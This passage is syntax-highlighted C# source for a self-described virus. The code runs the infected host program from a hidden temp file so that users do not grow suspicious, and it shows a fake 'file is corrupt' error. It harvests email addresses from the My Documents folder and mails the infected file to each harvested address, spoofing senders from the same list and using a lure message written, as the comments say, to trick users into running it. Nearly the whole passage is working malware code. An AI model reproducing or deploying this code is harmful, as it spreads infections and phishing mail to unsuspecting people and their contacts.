            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//this is a duplicate copy of the program so we need to do is
</span><span class="sc0">                </span><span class="sc2">//read the program starting with the end of the virus to the end of the file.
</span><span class="sc0">                </span><span class="sc2">//then output those bytes into a temp file and execute it.
</span><span class="sc0">                </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                    </span><span class="sc2">//create a random file name based on hourse, second, minute so should be like 605.exe or somethin
</span><span class="sc0">                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Hour</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Second</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Minute</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsTemp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">CreateNew</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">Hidden</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">//since we know the size of our program we can use it to skip down to the end
</span><span class="sc0">                    </span><span class="sc2">//which is the start of the original application we infected then we just have
</span><span class="sc0">                    </span><span class="sc2">//to write out the rest of the bytes..
</span><span class="sc0">                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">20480</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">fsTemp</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">virBytes</span><span class="sc10">[</span><span class="sc11">t</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">fsTemp</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc2">//after the temp file is written were gonna execute it so the user
</span><span class="sc0">                    </span><span class="sc2">//doesn't get suspicious.
</span><span class="sc0">                    </span><span class="sc5">try</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">).</span><span class="sc11">WaitForExit</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">er</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc6">"This file is corrupt"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Windows"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxButtons</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxIcon</span><span class="sc10">.</span><span class="sc11">Error</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc2">//delete the temp file after it exits. We don't want to reinfect
</span><span class="sc0">                    </span><span class="sc2">//it when they run us again.
</span><span class="sc0">                    </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">//Exit after we are done with our temp file
</span><span class="sc0">                    </span><span class="sc11">Application</span><span class="sc10">.</span><span class="sc11">Exit</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">argh</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Send</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">//returns all the emails we search for in the users my docs folder
</span><span class="sc0">            </span><span class="sc11">arrEmails</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SearchEmails</span><span class="sc10">(</span><span class="sc11">myDocs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*.*"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//reverse the order that we send so that
</span><span class="sc0">            </span><span class="sc2">//it can send to other emails.
</span><span class="sc0">            </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arrFrom</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrEmails</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">arrFrom</span><span class="sc10">.</span><span class="sc11">Reverse</span><span class="sc10">();</span><span class="sc0">
            
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFile</span><span class="sc10">();</span><span class="sc0">
            
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arrEmails</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//if we got an infected file and some emails lets send
</span><span class="sc0">                    </span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc11">data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">myEnum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrEmails</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">toAddy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">fromAddy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc2">//email list we already sent out to
</span><span class="sc0">                    </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arSent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc2">//loop each email we found
</span><span class="sc0">                    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">myEnum</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                        </span><span class="sc11">toAddy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">myEnum</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">fromEnum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrFrom</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">
                        
                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fromEnum</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            
                            </span><span class="sc11">fromAddy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">fromEnum</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">);</span><span class="sc0">
                            
                            </span><span class="sc2">//check to make sure the from and to addys aren't the same..
</span><span class="sc0">                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">toAddy</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">fromAddy</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc2">//make sure we already haven't sent it to this host
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">arSent</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc11">toAddy</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                                    </span><span class="sc11">arSent</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">toAddy</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc2">//mail settings
</span><span class="sc0">                                    </span><span class="sc11">MailAddress</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailAddress</span><span class="sc10">(</span><span class="sc11">toAddy</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">MailAddress</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailAddress</span><span class="sc10">(</span><span class="sc11">fromAddy</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">message</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">(</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">Subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hey"</span><span class="sc10">;</span><span class="sc0">

                                    </span><span class="sc2">//snoopys lame message body that will easily trick users into running it muwhahaha
</span><span class="sc0">                                    </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">Body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hey hows it going? I attached that file you were asking about. Let me know if it worKs for you or not. I'm not sure what I'm going to do the tommorow maybe get some coffee and do some shopping. Well give me a call later okay?"</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">message</span><span class="sc10">.</span><span class="sc11">Attachments</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc2">//call the GetMXRecords("@hotmail.com") method so we know what mail server to send to
</span><span class="sc0">                                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">toAddy</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">toAddy</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"@"</span><span class="sc10">)).</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"@"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">mailMxHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetMXRecords</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc2">//send it!
</span><span class="sc0">                                        </span><span class="sc11">SmtpClient</span><span class="sc0"> </span><span class="sc11">client</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpClient</span><span class="sc10">(</span><span class="sc11">mailMxHost</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">client</span><span class="sc10">.</span><span class="sc11">Send</span><span class="sc10">(</span><span class="sc11">message</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">er</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc11">data</span><span class="sc10">.</span><span class="sc11">Dispose</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc2">//search emails method pass a dir and filetype
</span><span class="sc0">        </span><span class="sc2">//then we read each file line by line and each
</span><span class="sc0">        </span><span class="sc2">//line gets checked for emails. If we find an
</span><span class="sc0">        </span><span class="sc2">//email and it doesn't exist already in the 
</span><span class="sc0">        </span><span class="sc2">//arraylist we add it.
</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">SearchEmails</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">fileType</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arEmails</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">dr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">FileInfo</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">filesInDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dr</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">fileType</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">filesInDir</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">sr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">input</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">input</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sr</span><span class="sc10">.</span><span class="sc11">ReadLine</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ExtractAddr</span><span class="sc10">(</span><span class="sc11">input</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                       </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">arEmails</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc2">//regex validation we revalidate our found emails again
</span><span class="sc0">                            </span><span class="sc2">//to make sure that what was returned was correct.
</span><span class="sc0">                            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">strValGex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                                               </span><span class="sc13">@"\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                                               </span><span class="sc13">@".)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$"</span><span class="sc10">;</span><span class="sc0">
                            
                            </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">regVal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc11">strValGex</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc2">//if match and doesn't exist yet in the arraylist add it.
</span><span class="sc0">                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">regVal</span><span class="sc10">.</span><span class="sc11">IsMatch</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">arEmails</span><span class="sc10">.</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">arEmails</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">arEmails</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ExtractAddr</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">InputData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc3">/*** genetix's email extractor thx u ;) ***/</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tmpExtractAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">AtPos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">AtPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">InputData</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"@"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">p2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">InputData</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">tmpExtractAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AtPos</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">tmpExtractAddr</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AtPos</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">--)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">InputData</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"&lt;"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"("</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">":"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">","</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AtPos</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">InputData</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">InputData</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"&gt;"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">")"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">":"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">","</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"]"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
